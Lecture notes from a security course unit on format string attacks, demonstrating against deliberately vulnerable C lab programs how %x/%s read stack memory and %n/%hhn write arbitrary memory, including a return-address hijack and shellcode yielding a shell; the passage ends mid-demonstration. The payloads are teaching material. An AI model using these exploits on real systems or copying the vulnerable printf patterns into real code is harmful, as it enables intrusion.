# Unit 6: Format String Attacks

Format String Attacks
=====================

A format string attack is an alternate form of exploiting programming
that doesn't necessarily require smashing the stack. Instead, it
leverages the format characters in a format string to generate excessive
data, read from arbitrary memory, or write to arbitrary memory.

At the heart of a format string attack is a casual programming error
regarding format strings that allows the user to provide the format
string portion, not just the arguments to the format. For example:

``` c
  #include <stdio.h>
  #include <stdlib.h>

  int main(int argc, char * argv[]){

    printf(argv[1]); // user controls the format
    printf("\n");
  }
```

In this program, the user provides the format portion of the `printf()`.
When we run this, for most of the common things, it doesn't matter:

``` {.example}
user@si485H-base:demo$ ./format_error "Hello World"
Hello World
user@si485H-base:demo$ ./format_error "Go Navy"
Go Navy
user@si485H-base:demo$ ./format_error "%x"
b7fff000
```

However, notice what happens when you give a format character, i.e., one
that starts with a '%.' The format character is interpreted and the
output is an address, an address on the stack, more precisely. What if I
were to give it something longer? What if we were to give it something
that would cause a memory address to be dereferenced, like a '%s' :

``` {.example}
user@si485H-base:demo$ ./format_error "%s.%s.%s.%s.%s.%s.%s"
4.??u?.UW1?VS???????unull).(null).?$?U?
user@si485H-base:demo$ ./format_error "%s.%s.%s.%s.%s.%s.%s.%s"
Segmentation fault (core dumped)
```

We can actually get the program to crash, and from we've seen so far,
getting the program to crash is usually the first step towards
exploiting the program, which is what we'll eventually do.

Uncommon Formats and Format Options
===================================

In order to full leverage the power of the format, we need to review the
full list of formats and format options. You should refer to the manual
page for all the details `man 3 printf`.

%n : Saving the Number of Bytes
-------------------------------

Format printing services allows you to save the total bytes formatted
into a variable. There is a decent chance you've never heard of this
format, but it actually is surprisingly useful for certain tasks. For
example, given a format and its arugments, it is not obvious how to
determine how long the output is until it actually formatted.

Here's a basic example, of using `%n`:

``` c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv){
  int count_one, count_two;

  printf("The number of bytes written up to this point X%n is being stored in count_one, "
     "and the number of bytes up to here X%n is being stored in count_two.\n",
     &count_one,&count_two);

  printf("count_one: %d\n", count_one);
  printf("count_two: %d\n", count_two);

  return 0;
}
```

The `%n` format matches to an address, in paticular an address of an
integer, at which the number of bytes formatted up to that point are
stored. So, for example, running this program, we get:

``` {.example}
user@si485H-base:demo$ ./format_n 
The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.
count_one: 46
count_two: 113
```

Note that the `%n` character is not actually produced in the output: it
is not printable. Instead, it only has a side effect.

Ok, so why does this format exist? Well, there are some really practical
uses, for example, consider counting the digits of a number read in
using `scanf()`:

``` c
user@si485H-base:demo$ cat scanf_n.c
#include <stdio.h>
#include <stdio.h>

int main(int argc, char * argv[]){

  int a,n;

  scanf("%d%n",&a,&n);

  printf("Number: %d Digits: %d\n",a,n);

}
```

``` {.example}
user@si485H-base:demo$ ./scanf_n 
1234567890
Number: 1234567890 Digits: 10
```

Or for example, to do text align ... there are a lot of reasonable
reasons to have this format.

Format Flag and Argument Options
--------------------------------

Another tool of formats we will need is some of the extra options for
formats to better manipulate the format output. So far you are fairly
familiar with the conversion formats:

-   `%d` : signed number
-   `%u` : unsigned number
-   `%x` : hexadecimal number
-   `%f` : floating point number
-   `%s` : string conversion

What you might not be aware is there is a wealth more options to change
the formatting. Here's a sample program that will illuminate some of
these, so called "flag" options:

``` c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv[]){

  int x = 0xdeadbeef;

  printf("%%d:(%d)\n",x);
  printf("%%u:(%u)\n",x);
  printf("%%x:(%x)\n",x);
  printf("%%#x:(%#x)\n",x);
  printf("%%#50x:(%#50x)\n",x);
  printf("%%#050x:(%#050x)\n",x);
  printf("%%1$#050x %%1$d:(%1$#050x %1$d)\n",x);
  printf("%%#050x:(%#050x)\n",x);
  printf("%%1$#050x %%1$d:(%1$#050x %1$d)\n",x);

}
```

``` {.example}
user@si485H-base:demo$ ./unusual_formats 
%d:(-559038737)
%u:(3735928559)
%x:(deadbeef)
%#x:(0xdeadbeef)
%#50x:(                                        0xdeadbeef)
%#050x:(0x0000000000000000000000000000000000000000deadbeef)
%1$#050x %1$d:(0x0000000000000000000000000000000000000000deadbeef -559038737)
%1$#050hx %1$hd:(0x00000000000000000000000000000000000000000000beef -16657)
%1$#050hhx %1$hd:(0x0000000000000000000000000000000000000000000000ef -17)
```

The first flag option is the "\#" which is used to add prefix
formatting. In the case of printing in hexadecimal it will add '0x' to
the start of non-zero values. That's pretty useful.

The next option is adding a number prior to the conversion argument, as
in `%#50x`. This conversion will *right adjust* the format such that the
entirety of the number takes up 50 hex digits. If you were to add a
leading 0 to the adjustment, as in `%#050x`, the format will fill those
blank spaces with 0's.

Perhaps the least familiar option you've seen is the `m$` format where
`m` is some number, allows you to refer to a specific argument being
passed. In the example above, we refer to the same argument twice using
two different conversion formats to follow. This is really useful to not
have to pass the same argument multiple times; however, when you use the
`$` references, you have to do for *all* the format arguments.

Finally, we have the half-conversion option `h` which says to only
convert half the typical size. In this case, since we are working with
4-byte integer values, that would mean to format a 2-byte short size
value when using one `h`, or a single char length 1-byte value with two,
`hh`.

Flag Options for Strings
------------------------

With strings, things are similar but a bit different. Here's some
example code:

``` c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv[]){

  char * string = "Go Navy! Beat Army!";

  printf("%%s:(%s)\n",string);
  printf("%%50s:(%50s)\n",string);
  printf("%%.5s:(%.5s)\n",string);
  printf("%%50.5s:(%50.5s)\n",string);
  printf("%%-50.5s:(%-50.5s)\n",string);

}
```

``` {.example}
user@si485H-base:demo$ ./string_formats 
%s:(Go Navy! Beat Army!)
%50s:(                               Go Navy! Beat Army!)
%.5s:(Go Na)
%50.5s:(                                             Go Na)
%-50.5s:(Go Na                                             )
```

Like with numbers, we can specify a length flag to right adjust the
string up to some specified size, but we can't fill in that with 0's.
Instead the space is filled with spaces.

Unlike with integer numbers (but can be done with float numbers) we can
also truncate the length of the format if we use the `.` option. The
number following the `.` says how many bytes from the string should be
used, and this can be combined with the right adjustment. And,
interestingly, the right adjustment can be flipped to left adjustment
with a negative sign.

While this is all on the output side and you can imagine where it might
be super useful, from a security perspective of overflow protection, the
right adjustment becomes a limiter to how many bytes can be written to
the target address:

``` c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv[]){

  char string[10];

  scanf("%10s",string);

  printf("%s\n",string);

}
```

``` {.example}
user@si485H-base:demo$ ./scanf_format 
HELLLOOOOOOOOOOOOOOO
HELLLOOOOO
```

Using formats in an exploit
===========================

Now that we've had a whirl-wind tour of formats you've never heard of
nor ever really wanted to use, how can we use them in an exploit. We'll
look at one method in this lesson involving stack smashing, but we'll
see some other techniques soon.

Here's the program we are going to exploit:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void good(){
  printf("good\n");
}

void bad(){
  printf("bad\n");
}

void vuln(char * str){

  char outbuf[512];
  char buffer[512];

  sprintf (buffer, "ERR Wrong command: %.400s", str);
  sprintf (outbuf, buffer); //<--- used as a silly copy

  printf("outbuf: %s\n", outbuf);

}

int main(int argc, char *argv[]){

  vuln(argv[1]);

}
```

This is a rather contrived example of using `sprintf()` to do a copy.
You might think because in the first `sprintf()` the `%.400s` format is
used, this would not enable a overflow of `buffer` or `outbuff`. For
example, this does not cause a segmentation fault:

``` {.example}
user@si485H-base:demo$ ./format_overflow `python -c "print 'A'*1000"`
outbuf: ERR Wrong command: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

True, we can't overflow `buffer`, but we can overflow `outbuff` because
`buffer` is treated as the format character. For example, what if the
input was like:

``` {.example}
user@si485H-base:demo$ ./format_overflow "%550x"
outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               bffff897
Segmentation fault (core dumped)
```

And if we look at the `dmesg` output:

``` {.example}
user@si485H-base:demo$ dmesg | tail -1
[181031.140058] format_overflow[16736]: segfault at 20202020 ip 20202020 sp bffff6b0 error 14
```

We see that we overwrote the instruction pointer with a bunch of 0x20
bytes, or spaces! Now, the goal is to overwrite the return address with
something useful, like the address of `bad()`.

``` {.example}
user@si485H-base:demo$ objdump -d format_overflow | grep bad
08048481 <bad>:
```

To do this, we need to do the right number of extended format to hit the
return address, We can do this by first using 0xdeadbeef and checking
the `dmesg` output:

``` {.example}
user@si485H-base:demo$ ./format_overflow "%500d$(printf '\xef\xbe\xad\xde')" > /dev/null ; dmesg | tail -1
Segmentation fault (core dumped)
[181507.663004] format_overflow[16817]: segfault at deadbe ip 08048504 sp bffff6b0 error 4 in format_overflow[8048000+1000]
user@si485H-base:demo$ ./format_overflow "%501d$(printf '\xef\xbe\xad\xde')" > /dev/null ; dmesg | tail -1
Illegal instruction (core dumped)
[181507.663004] format_overflow[16817]: segfault at deadbe ip 08048504 sp bffff6b0 error 4 in format_overflow[8048000+1000]
user@si485H-base:demo$ ./format_overflow "%502d$(printf '\xef\xbe\xad\xde')" > /dev/null ; dmesg | tail -1
Segmentation fault (core dumped)
[181516.038682] format_overflow[16827]: segfault at 80400de ip 080400de sp bffff6b0 error 14 in format_overflow[8048000+1000]
user@si485H-base:demo$ ./format_overflow "%503d$(printf '\xef\xbe\xad\xde')" > /dev/null ; dmesg | tail -1
Segmentation fault (core dumped)
[181519.371290] format_overflow[16832]: segfault at 800dead ip 0800dead sp bffff6b0 error 14 in format_overflow[8048000+1000]
user@si485H-base:demo$ ./format_overflow "%504d$(printf '\xef\xbe\xad\xde')" > /dev/null ; dmesg | tail -1
Segmentation fault (core dumped)
[181522.598268] format_overflow[16837]: segfault at deadbe ip 00deadbe sp bffff6b0 error 14 in format_overflow[8048000+1000]
user@si485H-base:demo$ ./format_overflow "%505d$(printf '\xef\xbe\xad\xde')" > /dev/null ; dmesg | tail -1
Segmentation fault (core dumped)
[181526.367333] format_overflow[16842]: segfault at deadbeef ip deadbeef sp bffff6b0 error 15
```

So if we use a 505 byte length %d format, the next 4-bytes we write is
the return address. And adding that, we get what we want:

``` {.example}
user@si485H-base:demo$ objdump -d format_overflow | grep bad
08048481 <bad>:
user@si485H-base:demo$ ./format_overflow "%505d$(printf '\x81\x84\x04\x08')" 
outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               -1073743725??
bad
Segmentation fault (core dumped)
```

We can also get this to execute a shell in the normal way (note how I
adjusted the jump point using dmesg).

``` {.example}
user@si485H-base:demo$ ./format_overflow "%505d$(printf '\xef\xbe\xad\xde')$(printf $(./hexify.sh smallest_shell))"
outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               -1073743746ﾭ?1???Phn/shh//bi??
                                                                                                                                                                         ̀
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[181798.445440] format_overflow[16919]: segfault at deadbeef ip deadbeef sp bffff690 error 15
user@si485H-base:demo$ ./format_overflow "%505d$(printf '\x90\xf6\xff\xbf')$(printf $(./hexify.sh smallest_shell))"
outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               -1073743746????1???Phn/shh//bi??
                                                                                                                                                                           ̀
$ echo "I did it!"
I did it!
$ 
```

Reading Memory with Format Attack
=================================

To start, let's return to the simple format example that is vulnerable:

``` c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv[]){

  char *s="Go Navy!";
  int a=0xdeadbeef;
  int b=0xcafebabe;
  printf(argv[1]); // user controls the format
  printf("\n");
}
```

In this example, the user controls the format to the process, so they
can pass in format sequences, like %\#08x, or %s, or %n, and cause the
printf to perform some action. The question we are concerned with first
is: what is actually being accessed when we do this?

To begin, if we run this program, we can start to get a sense of what is
going on:

``` {.example}
user@si485H-base:demo$ ./format_error AAAA
AAAA
user@si485H-base:demo$ ./format_error %#08x
0xbffff754
```

So, if I pass a `%#08x` we can see that there is what seems to be an
address printed out, and an address that is in the stack range. But,
what is that address? Where did it come from?

Reading up the stack
--------------------

Let's look at example `printf()` to think about how the arguments are
passed to it:

``` c
 void foo( ... ){
  //...
  printf("Format this: %d! And this: %s! And this too: %x", i, str, j);
  //...
 }
```

The arguments to this function within `printf`'s and `foo`'s stack frame
will look a little like this:

``` {.example}
                ... 
            |-----------|
          / |  ret addr |
         /  |-----------|
        /   |   sbp     |  (foo's return addres)
       |    |-----------|
       |    |  foo      |
 foo  -|    |  local    |
stack  |    |  variables| 
rrame  |    |-----------|
       |  / |    j      |
       | /  |-----------|
       |/   |    str    |
       /\   |-----------|
      |  \  |     i     |
      |   \ |-----------|
      |    \| fmt_str   +--> "Format this: %d! ..."
printf|     |-----------|
stack-|     | ret addr  |  (printf's return addres)
frame |     |-----------|
      |     |    sbp    | <- ebp
       \    |-----------|
        \   |  printf   |
         \  |  local    |
          \ |  variables| <- esp
        '-----------'
```

Now if we were to change our function, to something like this and leave
out the extra arguments to printf().

``` c
 void foo( ... ){
  //...
  printf("Format this: %d! And this: %s! And this too: %x"); //<--- 
  //...
 }
```

Now, we can start to get a sense of what happens in the format attack:

``` {.example}
                ... 
            |-----------|
           /|  ret addr |
          / |-----------|
         /  |   sbp     |  (foo's return addres)
        |   |-----------|
        |   |  foo      |
 foo   -|  /|  local    |
stack    \/ |  variables| 
rrame    /\ |-----------|
        /  \| fmt_str   +--> "Format this: %d! ..."
printf /    |-----------|
stack-|     | ret addr  |  (printf's return addres)
frame |     |-----------|
      |     |    sbp    | <- ebp
       \    |-----------|
        \   |  printf   |
         \  |  local    |
          \ |  variables| <- esp
        '-----------'

```

Even though we are no longer passing values to printf to use in the
format, printf will reach into the stack as if they are there. The
result is that, if we can control the formats to printf, we can view
arbitrary values on the stack.

Reading from
------------

As an example of this, let's return to our function, let's try and get
the extra variables in `main` to print out. To help with this, we'll add
the `print_stack` function so we can see where we are:

``` c
#include <stdio.h>
#include <stdlib.h>

#include "print_stack.h"

int main(int argc, char * argv[]){

  char *s="Go Navy!";
  int a=0xdeadbeef;
  int b=0xcafebabe;

  printf(argv[1]); // user controls the format
  printf("\n");
  print_stack("main",2); //<-- check out the stack here
}
```

``` {.example}
user@si485H-base:demo$ ./format_error %#08x.%#08x
0xbffff754.0xbffff760
--- STACK main ---
0xbffff6c4 <ebp+0xc>: bffff754
0xbffff6c0 <ebp+0x8>: 00000002
0xbffff6bc <ebp+0x4>: b7e34a83
0xbffff6b8 <ebp>: 00000000
0xbffff6b4 <ebp-0x4>: 00000000
0xbffff6b0 <ebp-0x8>: 08048580
0xbffff6ac <ebp-0xc>: 0804865c
0xbffff6a8 <ebp-0x10>: deadbeef
0xbffff6a4 <ebp-0x14>: cafebabe
0xbffff6a0 <ebp-0x18>: b7fc53c4
0xbffff69c <ebp-0x1c>: b7e4e42d
0xbffff698 <ebp-0x20>: bffff760 <---!!!
0xbffff694 <ebp-0x24>: 00000002
0xbffff690 <ebp-0x28>: 08048665
0xbffff68c <ebp-0x2c>: 0804857e
0xbffff688 <ebp-0x30>: bffff6b8
```

Notice that the first value that comes out is 0xbffff754, what is that?
Well some junk on the stack, but the second value, 0xbffff760, that's
something. In fact we see exactly where it is. (Note, I used the '.' to
seperaet each format to make it easier to read.)

Let's keep going with this little experiment:

``` {.example}
user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x
0xbffff754.0xbffff760.0xb7e4e42d
--- STACK main ---
0xbffff6c4 <ebp+0xc>: bffff754
0xbffff6c0 <ebp+0x8>: 00000002
0xbffff6bc <ebp+0x4>: b7e34a83
0xbffff6b8 <ebp>: 00000000
0xbffff6b4 <ebp-0x4>: 00000000
0xbffff6b0 <ebp-0x8>: 08048580
0xbffff6ac <ebp-0xc>: 0804865c
0xbffff6a8 <ebp-0x10>: deadbeef
0xbffff6a4 <ebp-0x14>: cafebabe
0xbffff6a0 <ebp-0x18>: b7fc53c4
0xbffff69c <ebp-0x1c>: b7e4e42d <-- !!!
0xbffff698 <ebp-0x20>: bffff760
0xbffff694 <ebp-0x24>: 00000002
0xbffff690 <ebp-0x28>: 08048665
0xbffff68c <ebp-0x2c>: 0804857e
0xbffff688 <ebp-0x30>: bffff6b8


user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x
0xbffff744.0xbffff750.0xb7e4e42d.0xb7fc53c4
--- STACK main ---
0xbffff6b4 <ebp+0xc>: bffff744
0xbffff6b0 <ebp+0x8>: 00000002
0xbffff6ac <ebp+0x4>: b7e34a83
0xbffff6a8 <ebp>: 00000000
0xbffff6a4 <ebp-0x4>: 00000000
0xbffff6a0 <ebp-0x8>: 08048580
0xbffff69c <ebp-0xc>: 0804865c
0xbffff698 <ebp-0x10>: deadbeef
0xbffff694 <ebp-0x14>: cafebabe 
0xbffff690 <ebp-0x18>: b7fc53c4 <-- !!!
0xbffff68c <ebp-0x1c>: b7e4e42d
0xbffff688 <ebp-0x20>: bffff750
0xbffff684 <ebp-0x24>: 00000002
0xbffff680 <ebp-0x28>: 08048665
0xbffff67c <ebp-0x2c>: 0804857e
0xbffff678 <ebp-0x30>: bffff6a8


user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x
0xbffff744.0xbffff750.0xb7e4e42d.0xb7fc53c4.0xcafebabe
--- STACK main ---
0xbffff6b4 <ebp+0xc>: bffff744
0xbffff6b0 <ebp+0x8>: 00000002
0xbffff6ac <ebp+0x4>: b7e34a83
0xbffff6a8 <ebp>: 00000000
0xbffff6a4 <ebp-0x4>: 00000000
0xbffff6a0 <ebp-0x8>: 08048580
0xbffff69c <ebp-0xc>: 0804865c
0xbffff698 <ebp-0x10>: deadbeef
0xbffff694 <ebp-0x14>: cafebabe <-- !!!
0xbffff690 <ebp-0x18>: b7fc53c4
0xbffff68c <ebp-0x1c>: b7e4e42d
0xbffff688 <ebp-0x20>: bffff750
0xbffff684 <ebp-0x24>: 00000002
0xbffff680 <ebp-0x28>: 08048665
0xbffff67c <ebp-0x2c>: 0804857e
0xbffff678 <ebp-0x30>: bffff6a8


user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x
0xbffff744.0xbffff750.0xb7e4e42d.0xb7fc53c4.0xcafebabe.0xdeadbeef
--- STACK main ---
0xbffff6b4 <ebp+0xc>: bffff744
0xbffff6b0 <ebp+0x8>: 00000002
0xbffff6ac <ebp+0x4>: b7e34a83
0xbffff6a8 <ebp>: 00000000
0xbffff6a4 <ebp-0x4>: 00000000
0xbffff6a0 <ebp-0x8>: 08048580
0xbffff69c <ebp-0xc>: 0804865c
0xbffff698 <ebp-0x10>: deadbeef <-- !!!
0xbffff694 <ebp-0x14>: cafebabe
0xbffff690 <ebp-0x18>: b7fc53c4
0xbffff68c <ebp-0x1c>: b7e4e42d
0xbffff688 <ebp-0x20>: bffff750
0xbffff684 <ebp-0x24>: 00000002
0xbffff680 <ebp-0x28>: 08048665
0xbffff67c <ebp-0x2c>: 0804857e
0xbffff678 <ebp-0x30>: bffff6a8


user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x
0xbffff734.0xbffff740.0xb7e4e42d.0xb7fc53c4.0xcafebabe.0xdeadbeef.0x804865c
--- STACK main ---
0xbffff6a4 <ebp+0xc>: bffff734
0xbffff6a0 <ebp+0x8>: 00000002
0xbffff69c <ebp+0x4>: b7e34a83
0xbffff698 <ebp>: 00000000
0xbffff694 <ebp-0x4>: 00000000
0xbffff690 <ebp-0x8>: 08048580
0xbffff68c <ebp-0xc>: 0804865c  <-- !!!
0xbffff688 <ebp-0x10>: deadbeef
0xbffff684 <ebp-0x14>: cafebabe
0xbffff680 <ebp-0x18>: b7fc53c4
0xbffff67c <ebp-0x1c>: b7e4e42d
0xbffff678 <ebp-0x20>: bffff740
0xbffff674 <ebp-0x24>: 00000002
0xbffff670 <ebp-0x28>: 08048665
0xbffff66c <ebp-0x2c>: 0804857e
0xbffff668 <ebp-0x30>: bffff698

```

Now, we can change the last format to a `%s` and we can see the "Go Navy
string"

``` {.example}
user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%s
0xbffff734.0xbffff740.0xb7e4e42d.0xb7fc53c4.0xcafebabe.0xdeadbeef.Go Navy!
--- STACK main ---
0xbffff6a4 <ebp+0xc>: bffff734
0xbffff6a0 <ebp+0x8>: 00000002
0xbffff69c <ebp+0x4>: b7e34a83
0xbffff698 <ebp>: 00000000
0xbffff694 <ebp-0x4>: 00000000
0xbffff690 <ebp-0x8>: 08048580
0xbffff68c <ebp-0xc>: 0804865c
0xbffff688 <ebp-0x10>: deadbeef
0xbffff684 <ebp-0x14>: cafebabe
0xbffff680 <ebp-0x18>: b7fc53c4
0xbffff67c <ebp-0x1c>: b7e4e42d
0xbffff678 <ebp-0x20>: bffff740
0xbffff674 <ebp-0x24>: 00000002
0xbffff670 <ebp-0x28>: 08048665
0xbffff66c <ebp-0x2c>: 0804857e
0xbffff668 <ebp-0x30>: bffff698
```

Using Formats to Your Advantage
-------------------------------

So that was a lot of work for tacking on %'s to get to "Go Navy" before.
We can do better if we leverage the formats. In particular, the argument
indexes format using the \$.

Recall that you can refer to a specific argument in the format, such as
in this example:

``` c
  printf("%1$x %1$d\n",x);
```

Here, we have a single argument to the format statement, but we have two
formats. Each format usesin `%1$*` to refer to the 1'st argument so we
can reference it twice. For example, the above is equivalent to the
below

``` c
  printf("%x %d\n",x,x);
```

where the value being formatted is passed twice as an argument.

Now, let's do the same thing above to get the format to print. We can
count 7 total format directives until we reach the string, so we can use
the `%7$s` to print the string with a single format directive.

``` {.example}
user@si485H-base:demo$ ./format_error "%7\$s"
Go Navy!
--- STACK main ---
0xbffff6c4 <ebp+0xc>: bffff754
0xbffff6c0 <ebp+0x8>: 00000002
0xbffff6bc <ebp+0x4>: b7e34a83
0xbffff6b8 <ebp>: 00000000
0xbffff6b4 <ebp-0x4>: 00000000
0xbffff6b0 <ebp-0x8>: 08048580
0xbffff6ac <ebp-0xc>: 0804865c
0xbffff6a8 <ebp-0x10>: deadbeef
0xbffff6a4 <ebp-0x14>: cafebabe
0xbffff6a0 <ebp-0x18>: b7fc53c4
0xbffff69c <ebp-0x1c>: b7e4e42d
0xbffff698 <ebp-0x20>: bffff760
0xbffff694 <ebp-0x24>: 00000002
0xbffff690 <ebp-0x28>: 08048665
0xbffff68c <ebp-0x2c>: 0804857e
0xbffff688 <ebp-0x30>: bffff6b8
```

/(Note that I had to escape the dollar symbol (`\$`) because `$` is a
special bash command.)/

You'll be surprised how useful this is later.

Writing Memory with a Format Attack
===================================

Now that you have a sense of how we can read memory arbitrarily, it is
time to unlock the true magic of the format print: **writing** **to**
**arbitrary** **memory**. This may not seem possible, but it totally is
and it is *totally awesome*. The key to writing to memory is the `%n`
format which will save the total number of bytes formatted so far. So
conceptually, if you were to format the right number of bytes (e.g., an
address worth of bytes, like 0xbfff678) and then save how many bytes you
formatted to the right place (e.g., the return address), then you could
hijack a program! Easy, right?! Well, sometimes ... we'll take it in
steps.

Controlling where we write
--------------------------

First let's recall that the `%n` format works. The `%n` format directive
will write how many bytes have been formatted to the address passed as
argument that matches the `%n`.The challenge then is just alignment and
formatting enough bytes.

To demonstrate this, we'll work with the following program:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUF_SIZE 1024
int main(int argc, char * argv[]){
  char buf[BUF_SIZE];

  static int test_val = 0x00414141; //"AAA\0" as an int


  strncpy(buf, argv[1], BUF_SIZE);

  printf("Right: ");
  printf("%s", buf);//<------safe
  printf("\n\n");

  printf("Wrong: ");
  printf(buf);      //<------vulnerable
  printf("\n\n");

  printf("[*] test_val @ %p = %d 0x%08x\n", &test_val,test_val,test_val);

  exit(0);

}
```

Let's see if we can overwrite test~val~ with any integer of our
choosing. To start with, let's see if we can change 0x00414141 to
0xEEDDCCBB.

To start, we need to determine how to align everything. To do this,
we'll begin by seeding our format string with something we can hunt for,
like BBBB and then look to see when our formats find that. Since we are
working in main, we are essentially hunting up the stack trying to find
the command line argument value that is the format string we are passing
in.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln BBBB
Right: BBBB

Wrong: BBBB

[*] test_val @ 0x804a02c = 4276545 0x00414141

user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x
Right: BBBB.%#08x

Wrong: BBBB.0xbffff2c0

[*] test_val @ 0x804a02c = 4276545 0x00414141

user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x
Right: BBBB.%#08x.%#08x

Wrong: BBBB.0xbffff2b0.0x000400

[*] test_val @ 0x804a02c = 4276545 0x00414141

user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x
Right: BBBB.%#08x.%#08x.%#08x

Wrong: BBBB.0xbffff2b0.0x000400.0x000004

[*] test_val @ 0x804a02c = 4276545 0x00414141

user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x.%#08x
Right: BBBB.%#08x.%#08x.%#08x.%#08x

Wrong: BBBB.0xbffff2b0.0x000400.0x000004.0x42424242

[*] test_val @ 0x804a02c = 4276545 0x00414141
```

We found it, and the significance of that is really important because
that means we now control one of the arguments to the format. Consider
what happens when I change the last format directive to a `%n`.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x.%n
Right: BBBB.%#08x.%#08x.%#08x.%n

Segmentation fault (core dumped)
```

I get a segfault, and now you should all know that that means pay dirt
for exploits. Let's see where we crashed with dmesg:

``` {.example}
user@si485H-base:demo$ dmesg | tail -1
[4571638.361817] fmt_vuln[18555]: segfault at 42424242 ip b7e619ee sp bfffed60 error 6 in libc-2.19.so[b7e1b000+1a8000]
```

We crashed when we dereferenced 0x42424242, and we control that address.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln ABCD.%#08x.%#08x.%#08x.%n
Right: ABCD.%#08x.%#08x.%#08x.%n

Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[4571771.090412] fmt_vuln[18559]: segfault at 44434241 ip b7e619ee sp bfffed60 error 6 in libc-2.19.so[b7e1b000+1a8000]

user@si485H-base:demo$ ./fmt_vuln $(printf "\xef\xbe\xad\xde").%#08x.%#08x.%#08x.%n
Right: ﾭ?.%#08x.%#08x.%#08x.%n

Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[4571823.069638] fmt_vuln[18564]: segfault at deadbeef ip b7e619ee sp bfffed60 error 7 in libc-2.19.so[b7e1b000+1a8000]
```

If we control that value, it also means that we can put anything there,
not just deadbeef, but a totally valid address that we want to change.

Writing a Single Byte
---------------------

Now, to write a byte, let's plug into the leading B's the address of the
target~value~, which we see is 0x804a02c. We can use the command line
printf to do that output:

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%n
Right: ,.%#08x.%#08x.%#08x.%n

Wrong: ,.0xbffff2b0.0x000400.0x000004.

[*] test_val @ 0x804a02c = 34 0x00000022
```

Great! That worked. But, we overwrote the whole target value including
the A's. That's because we are writing a whole integer. What we really
want to do is get it to write a single value, maybe just that null byte.

For that, we use the format directive flag `h`, which specifies using
the half the format. So, for example, if we used `%hn` then we are
writing the number of formatted bytes to a 2-byte short value. And if we
use `%hhn`, then we are writing the number of formatted bytes to a
1-byte char value. For example:

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%hn
Right: ,.%#08x.%#08x.%#08x.%hn

Wrong: ,.0xbffff2b0.0x000400.0x000004.

[*] test_val @ 0x804a02c = 4259874 0x00410022
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
Right: ,.%#08x.%#08x.%#08x.%hhn

Wrong: ,.0xbffff2b0.0x000400.0x000004.

[*] test_val @ 0x804a02c = 4276514 0x00414122
```

Now that, we've got that one byte written, we have to align it. We are 3
bytes off, but that is an easy fix by changing the address of where we
are writing to.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
Right: /.%#08x.%#08x.%#08x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x000004.

[*] test_val @ 0x804a02c = 574701889 0x22414141
```

Controlling what you write
--------------------------

Now that we can write a single byte, how do we control what we write?
For that, we have to remember exactly what `%n` does, it writes the
number of bytes formatted so far. And, we control how many bytes are
provided to the format, so we just have to increase or decrease the
total number of bytes.

That means, for every additional byte we add prior to the `%n`, we
increase the value of the byte we write by one.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")A.%#08x.%#08x.%#08x.%hhn
Right: /A.%#08x.%#08x.%#08x.%hhn

Wrong: /A.0xbffff2b0.0x000400.0x000004.

[*] test_val @ 0x804a02c = 591479105 0x23414141

user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")AA.%#08x.%#08x.%#08x.%hhn
Right: /AA.%#08x.%#08x.%#08x.%hhn

Wrong: /AA.0xbffff2b0.0x000400.0x000004.

